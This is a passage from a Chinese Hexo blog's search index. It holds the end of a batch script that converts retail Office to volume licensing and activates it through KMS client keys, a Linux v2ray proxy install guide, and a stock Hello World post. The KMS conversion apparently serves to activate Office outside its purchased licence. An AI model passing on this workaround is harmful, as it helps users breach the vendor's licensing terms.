&quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\SkypeforBusinessVL_KMS_Client-ul-oob.xrm-ms&quot;</span><br><span class="line"></span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\client-issuance-bridge-office.xrm-ms</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\client-issuance-root.xrm-ms</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\client-issuance-root-bridge-test.xrm-ms</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\client-issuance-stil.xrm-ms</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\client-issuance-ul.xrm-ms</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\client-issuance-ul-oob.xrm-ms</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inslic:&quot;%OfficePath%\root\Licenses16\pkeyconfig-office.xrm-ms</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">for %%a in (%OPPKEY% %PPKEY% %VPKEY% %S4BKEY%) do cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /inpkey:%%a</span><br><span class="line">cscript &quot;%OfficePath%\Office16\ospp.vbs&quot; /act</span><br><span class="line"></span><br><span class="line">echo.</span><br><span class="line">echo Retail to Volume License conversion finished.</span><br><span class="line">echo.</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 🎃魔法南瓜 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kms </tag>
            
            <tag> windows </tag>
            
            <tag> office </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux上v2ray的搭建</title>
      <link href="/posts/hexcsn/"/>
      <url>/posts/hexcsn/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-6">前言</h2><p>V2Ray 是 Project V 下的一个工具。Project V 是一个包含一系列构建特定网络环境工具的项目，而 V2Ray 属于最核心的一个。 官方中介绍<code>Project V 提供了单一的内核和多种界面操作方式。内核（V2Ray）用于实际的网络交互、路由等针对网络数据的处理，而外围的用户界面程序提供了方便直接的操作流程。</code>不过从时间上来说，先有 V2Ray 才有 Project V。 如果还是不理解，那么简单地说，V2Ray 是一个与 Shadowsocks 类似的代理软件，可以用来科学上网（翻墙）学习国外先进科学技术。</p><p>V2Ray 用户手册：<a href="https://www.v2ray.com">https://www.v2ray.com</a>（已被墙） <a href="https://v2ray.cool">https://v2ray.cool</a>（已被墙）</p><p>V2Ray 项目地址：<a href="https://github.com/v2ray/v2ray-core">https://github.com/v2ray/v2ray-core</a></p><p>V2Ray Telegram 使用群链接：<a href="https://t.me/projectv2ray">https://t.me/projectv2ray</a></p><h2 id="快速开始-4">快速开始</h2><p>基本上所有的 Linux 都可以这么搭建</p><h3 id="下载—解压">下载—解压</h3><p>在<a href="https://github.com/v2ray/v2ray-core/releases/">官网</a>下载 v2ray，或者用我写的老版本的 v2ray 也可以<br>将压缩文件解压至指定文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/v2ray/v2ray-core/releases/download/v3.24/v2ray-linux-64.zip</span><br><span class="line">unzip v2ray-linux-64.zip -d v2ray</span><br><span class="line">ll -a</span><br></pre></td></tr></table></figure><h3 id="文件处理">文件处理</h3><p>根据 v2ray 服务进行文件处理</p><p>我用的是复制 cp，还可以移动 mv,或使用软连接的形式（软连接方便打包）（必须使用绝对路径）</p><p>最后一条命令是将当前的 vpoint_vmess_freedom.json 配置文件复制到指定位置，并修改其为 config.json</p><div class="note primary flat"><p><strong>由于 V2Ray 是不区分服务端和客户端的，同一个程序可以配置成服务器也可以配置成客户端，程序目录中的 vpoint_vmess_freedom.json 一般用于配置服务器，而 vpoint_socks_vmess.json 用于配置成为客户端。</strong></p></div><p>给的 config.json 为默认配置借鉴抄下来改良即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> v2ray</span><br><span class="line"><span class="built_in">mkdir</span> /usr/bin/v2ray</span><br><span class="line"><span class="built_in">cp</span> v2ray /usr/bin/v2ray/v2ray</span><br><span class="line"><span class="built_in">cp</span> v2ctl /usr/bin/v2ray/v2ctl</span><br><span class="line"><span class="built_in">cp</span> geoip.dat /usr/bin/v2ray/geoip.dat</span><br><span class="line"><span class="built_in">cp</span> geosite.dat /usr/bin/v2ray/geosite.dat</span><br><span class="line"><span class="built_in">mkdir</span> /etc/v2ray/</span><br><span class="line"><span class="built_in">cp</span> vpoint_vmess_freedom.json /etc/v2ray/config.json</span><br></pre></td></tr></table></figure><h3 id="服务">服务</h3><p>添加服务不添加打不开 v2ray mv 软连接也可以 （里面的路径别忘了改了）<br>创建日志 开机自启<br>pid 文件防止启动多个进程副本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> /systemd/v2ray.service /usr/lib/systemd/system</span><br><span class="line"><span class="built_in">mkdir</span> /var/log/v2ray/</span><br><span class="line"><span class="built_in">touch</span> /var/log/v2ray/access.log</span><br><span class="line"><span class="built_in">touch</span> /var/log/v2ray/error.log</span><br><span class="line"><span class="built_in">touch</span> /var/run/v2ray.pid</span><br><span class="line">systemctl restart v2ray.service</span><br><span class="line">systemctl status v2ray.service</span><br><span class="line">systemctl <span class="built_in">enable</span> v2ray.service</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 🍊魔法橙子 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> v2ray </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/tmt5y4/"/>
      <url>/posts/tmt5y4/</url>
      
        <content type="html"><![CDATA[<p>欢迎来到 <a href="https://cheng1622.github.io">橙子の魔法屋</a>! 这是一个基于 hexo 搭建的博客。</p><h2 id="Quick-Start">Quick Start</h2><h3 id="Create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p><p>主题：butterfly</p>]]></content>
      
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
